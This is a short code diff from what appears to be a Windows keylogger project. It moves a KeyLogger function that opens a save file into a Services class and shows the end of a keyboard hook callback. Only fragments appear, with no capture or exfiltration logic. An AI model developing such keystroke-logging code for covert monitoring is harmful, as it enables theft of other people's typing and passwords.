@@ -1,6 +1,6 @@
 #include "KeyLogger.h"
 
-bool KeyLogger(const std::string &saveFile) {  
+bool Services::keyLogger(const std::string &saveFile) {  
     std::ofstream fout(saveFile.c_str());  
     if (!fout.is_open()) {  
         return false;  
@@ -251,4 +251,3 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     }  
     return CallNextHookEx(NULL, nCode, wParam, lParam);  
 }  
-
